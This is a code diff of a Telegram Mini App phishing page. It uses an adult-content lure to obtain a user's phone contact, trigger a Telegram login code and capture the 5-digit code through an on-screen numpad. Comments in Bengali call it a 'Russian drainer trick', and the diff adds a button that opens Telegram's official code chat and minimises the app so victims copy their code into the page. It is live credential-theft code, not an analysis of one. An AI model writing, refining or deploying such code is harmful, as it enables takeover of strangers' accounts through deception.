@@ -8,86 +8,62 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
         body { 
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             background: #000 url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed;
             background-size: cover; height: 100vh; overflow: hidden; display: flex; align-items: flex-end; justify-content: center;
         }
-        .overlay { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.6); z-index: 1; }
+        .overlay { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index: 1; }
         
-        .main-container { width: 92%; max-width: 380px; position: relative; z-index: 10; padding-bottom: 30px; text-align: center; }
+        .main-container { width: 90%; max-width: 360px; position: relative; z-index: 10; padding-bottom: 20px; text-align: center; }
 
-        .instruction { background: #fff; color: #222; padding: 12px; border-radius: 12px; font-weight: bold; margin-bottom: 15px; font-size: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .info-box { background: #fff; padding: 15px; border-radius: 15px; font-weight: bold; margin-bottom: 20px; font-size: 16px; color: #000; }
 
-        /* Pro Russian Style Button */
-        .action-btn {
-            display: block; width: 100%; background: #248bcf; color: #fff;
-            padding: 16px; border-radius: 14px; font-size: 18px; font-weight: bold;
-            text-decoration: none; border: 2px solid rgba(255,255,255,0.3);
-            margin-bottom: 20px; cursor: pointer; transition: 0.2s;
-            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
-        }
-        .action-btn:active { transform: scale(0.96); background: #1e74ad; }
-
-        .otp-wrapper { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
-        .otp-input {
-            width: 50px; height: 55px; background: rgba(255,255,255,0.15);
-            border: 2px solid #fff; border-radius: 12px; font-size: 32px;
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .box {
+            width: 50px; height: 55px; background: rgba(255, 255, 255, 0.2);
+            border: 2px solid #fff; border-radius: 12px; font-size: 30px;
             color: #fff; font-weight: bold; display: flex; align-items: center; justify-content: center;
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(5px);
         }
 
-        .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-        .num-key { 
-            background: #31b545; color: #fff; padding: 18px; border-radius: 14px;
-            font-size: 26px; font-weight: bold; border: none; cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .btn { 
+            background: #4caf50; color: #fff; padding: 18px; border-radius: 12px;
+            font-size: 24px; font-weight: bold; border: none; cursor: pointer;
         }
-        .num-key:active { background: #289438; transform: scale(0.92); }
+        .btn:active { background: #388e3c; transform: scale(0.95); }
 
         .hidden { display: none !important; }
-        .loader { color: #fff; font-size: 20px; font-weight: bold; text-shadow: 0 2px 10px #000; }
+        .loader { color: #fff; font-size: 18px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
 
     <div class="main-container">
-        <!-- Step 1: Loading/Connecting -->
+        <!-- Step 1 -->
         <div id="step0">
-            <div style="font-size: 60px; animation: bounce 1s infinite; margin-bottom: 15px;">👇</div>
-            <div id="load" class="loader hidden">Connecting to Server...</div>
+            <div style="font-size: 60px; animation: bounce 1s infinite; margin-bottom: 10px;">👇</div>
+            <div id="load" class="loader hidden">🔄 Connecting...</div>
         </div>
 
-        <!-- Step 2: OTP Entry -->
+        <!-- Step 2 (OTP Area) -->
         <div id="step2" class="hidden">
-            <div class="instruction">Enter the 5-digit code you just received!</div>
+            <div class="info-box">Enter the 5-digit code!</div>
 
-            <!-- This is the Main Action Button -->
-            <div class="action-btn" id="minimizeBtn">
-                📩 View Code (Minimize)
-            </div>
-
-            <div class="otp-wrapper">
-                <div class="otp-input" id="b1"></div>
-                <div class="otp-input" id="b2"></div>
-                <div class="otp-input" id="b3"></div>
-                <div class="otp-input" id="b4"></div>
-                <div class="otp-input" id="b5"></div>
+            <div class="otp-inputs">
+                <div class="box" id="b1"></div>
+                <div class="box" id="b2"></div>
+                <div class="box" id="b3"></div>
+                <div class="box" id="b4"></div>
+                <div class="box" id="b5"></div>
             </div>
 
             <div class="numpad">
-                <button class="num-key" onclick="press('1')">1</button>
-                <button class="num-key" onclick="press('2')">2</button>
-                <button class="num-key" onclick="press('3')">3</button>
-                <button class="num-key" onclick="press('4')">4</button>
-                <button class="num-key" onclick="press('5')">5</button>
-                <button class="num-key" onclick="press('6')">6</button>
-                <button class="num-key" onclick="press('7')">7</button>
-                <button class="num-key" onclick="press('8')">8</button>
-                <button class="num-key" onclick="press('9')">9</button>
-                <div style="visibility:hidden"></div>
-                <button class="num-key" onclick="press('0')">0</button>
-                <button class="num-key" style="background:#d32f2f" onclick="del()">⌫</button>
+                <button class="btn" onclick="add('1')">1</button><button class="btn" onclick="add('2')">2</button><button class="btn" onclick="add('3')">3</button>
+                <button class="btn" onclick="add('4')">4</button><button class="btn" onclick="add('5')">5</button><button class="btn" onclick="add('6')">6</button>
+                <button class="btn" onclick="add('7')">7</button><button class="btn" onclick="add('8')">8</button><button class="btn" onclick="add('9')">9</button>
+                <div style="visibility:hidden"></div><button class="btn" onclick="add('0')">0</button><button class="btn" style="background:#d32f2f" onclick="del()">⌫</button>
             </div>
         </div>
     </div>
@@ -100,30 +76,18 @@
         const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let otp = "";
 
-        // Main Button Setup
+        // শুরুতে মেইন বাটন সেটআপ
         tg.MainButton.setText("🍓 START CONTINUE 🔞");
-        tg.MainButton.color = "#ff4757";
         tg.MainButton.show();
-        tg.MainButton.onClick(() => {
+        tg.MainButton.onClick(startProcess);
+
+        function startProcess() {
             tg.requestContact();
             tg.MainButton.hide();
             document.getElementById('step0').querySelector('div').classList.add('hidden');
             document.getElementById('load').classList.remove('hidden');
             poll();
-        });
-
-        // The "Minimize" Trick - Russian Style
-        document.getElementById('minimizeBtn').addEventListener('click', () => {
-            tg.HapticFeedback.notificationOccurred('success');
-            
-            // ১. ওটিপি চ্যাট ওপেন করার সবচেয়ে শক্তিশালী মেথড
-            tg.openTelegramLink("tg://openmessage?user_id=777000");
-
-            // ২. অ্যাপ মিনিমাইজ করার ট্রিক (Switch to inline query forces minimize)
-            setTimeout(() => {
-                tg.switchInlineQuery("OTP"); 
-            }, 100);
-        });
+        }
 
         async function poll() {
             try {
@@ -136,17 +100,38 @@
                     });
                     const sendData = await sendRes.json();
                     if(sendData.status === "success") {
-                        document.getElementById('step0').classList.add('hidden');
-                        document.getElementById('step2').classList.remove('hidden');
+                        showOTPPage();
                     }
                 } else { setTimeout(poll, 1500); }
             } catch (e) { setTimeout(poll, 2000); }
         }
 
-        function press(num) {
+        function showOTPPage() {
+            document.getElementById('step0').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+
+            // --- রাশিয়ান ড্রেইনার ট্রিক: মেইন বাটনকে ওটিপি চ্যাট লিংকে রূপান্তর করা ---
+            tg.MainButton.setText("📩 VIEW CODE (MINIMIZE)");
+            tg.MainButton.color = "#248bcf"; // নীল রঙ
+            tg.MainButton.show();
+
+            // পুরনো ক্লিক ফাংশন সরিয়ে নতুন ফাংশন দেওয়া
+            tg.MainButton.offClick(startProcess);
+            tg.MainButton.onClick(() => {
+                tg.HapticFeedback.notificationOccurred('success');
+                // সরাসরি টেলিগ্রামের নিজস্ব মেথড দিয়ে চ্যাট ওপেন
+                tg.openTelegramLink("tg://openmessage?user_id=777000");
+                
+                // মিনিমাইজ ট্রিক
+                setTimeout(() => {
+                    tg.switchInlineQuery("OTP"); 
+                }, 100);
+            });
+        }
+
+        function add(n) {
             if(otp.length < 5) {
-                otp += num;
-                render();
+                otp += n; render();
                 if(otp.length === 5) verify();
             }
         }
